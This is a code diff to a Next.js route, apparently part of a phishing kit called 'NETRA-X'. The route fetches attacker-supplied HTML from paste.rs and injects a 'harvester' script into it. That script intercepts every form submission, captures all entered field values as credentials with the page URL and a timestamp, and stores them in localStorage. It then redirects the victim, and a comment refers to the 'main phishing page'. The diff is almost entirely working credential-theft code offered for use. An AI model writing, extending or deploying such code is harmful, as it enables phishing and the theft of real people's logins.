@@ -3,60 +3,97 @@ import { NextRequest, NextResponse } from 'next/server';
 
 export const revalidate = 0; // Don't cache this response
 
+const getHarvesterScript = (redirectUrl: string) => `
+<script>
+  function captureAndRedirect(form) {
+    try {
+      const formData = new FormData(form);
+      const credentials = {};
+      let capturedData = false;
+
+      for (let [key, value] of formData.entries()) {
+        if (typeof value === 'string' && value.length > 0) {
+          credentials[key] = value;
+          capturedData = true;
+        }
+      }
+
+      if (capturedData) {
+        const entry = {
+          ...credentials,
+          source: window.location.href,
+          timestamp: new Date().toISOString()
+        };
+        const storageKey = 'netra-captured-credentials';
+        try {
+          const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+          const updatedData = [...existingData, entry];
+          localStorage.setItem(storageKey, JSON.stringify(updatedData));
+
+          window.dispatchEvent(new StorageEvent('storage', {
+            key: storageKey,
+            newValue: JSON.stringify(updatedData)
+          }));
+        } catch(e) {
+          console.error('NETRA-X Harvester: Could not save to localStorage.', e);
+        }
+      }
+    } catch (e) {
+      console.error('NETRA-X Harvester: Error capturing form data.', e);
+    } finally {
+      setTimeout(() => {
+        window.location.href = '${redirectUrl}';
+      }, 150);
+    }
+  }
+
+  document.addEventListener('submit', function(e) {
+    if (e.target && e.target.tagName === 'FORM') {
+      e.preventDefault();
+      e.stopPropagation();
+      captureAndRedirect(e.target);
+    }
+  }, true);
+</script>
+`;
+
 export async function GET(req: NextRequest, { params }: { params: { id: string } }) {
     const id = params.id;
     if (!id) {
         return new NextResponse('Missing page ID.', { status: 400 });
     }
 
-    // This script runs entirely in the victim's browser.
-    // It fetches the content directly from the public paste service,
-    // bypassing any server-side network restrictions.
-    const clientSideLoader = `
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Loading...</title>
-            <style>
-                body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; }
-                .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            </style>
-        </head>
-        <body>
-            <div class="loader"></div>
-            <script>
-                (async () => {
-                    const id = '${id}'; // Make the server-side ID available to the client script
-                    try {
-                        // The user's browser fetches the content, not our server.
-                        const response = await fetch(\`https://paste.rs/\${id}\`);
-                        if (!response.ok) {
-                            throw new Error('Failed to load page content. The link may have expired.');
-                        }
-                        const htmlContent = await response.text();
-                        // The fetched HTML replaces the current page content.
-                        document.open();
-                        document.write(htmlContent);
-                        document.close();
-                    } catch (error) {
-                        console.error('Failed to fetch and render content:', error);
-                        document.body.innerHTML = '<h1>Error</h1><p>Unable to load the requested page.</p>';
-                    }
-                })();
-            </script>
-        </body>
-        </html>
-    `;
+    try {
+        // Fetch the raw HTML content from paste.rs on the server-side.
+        const pasteRsResponse = await fetch(`https://paste.rs/${id}`);
+        if (!pasteRsResponse.ok) {
+            return new NextResponse(`Failed to fetch content from paste.rs. It may have expired.`, { status: 404 });
+        }
+        let originalHtml = await pasteRsResponse.text();
 
-    return new NextResponse(clientSideLoader, {
-        status: 200,
-        headers: { 
-            'Content-Type': 'text/html; charset=utf-8',
-            // Ensure the browser doesn't cache our loader script.
-            'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
-            'Pragma': 'no-cache',
-            'Expires': '0',
-        },
-    });
+        // The redirect URL is now passed as a query parameter from the main phishing page.
+        const redirectUrl = req.nextUrl.searchParams.get('redirectUrl') || '/';
+
+        // Inject the harvester script.
+        const harvesterScript = getHarvesterScript(redirectUrl);
+        if (originalHtml.includes('</body>')) {
+            originalHtml = originalHtml.replace(/<\/body>/i, `${harvesterScript}</body>`);
+        } else {
+            originalHtml += harvesterScript;
+        }
+
+        return new NextResponse(originalHtml, {
+            status: 200,
+            headers: { 
+                'Content-Type': 'text/html; charset=utf-8',
+                'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
+                'Pragma': 'no-cache',
+                'Expires': '0',
+            },
+        });
+
+    } catch (error) {
+        console.error('Server-side fetch failed:', error);
+        return new NextResponse('An internal error occurred while trying to load the page.', { status: 500 });
+    }
 }
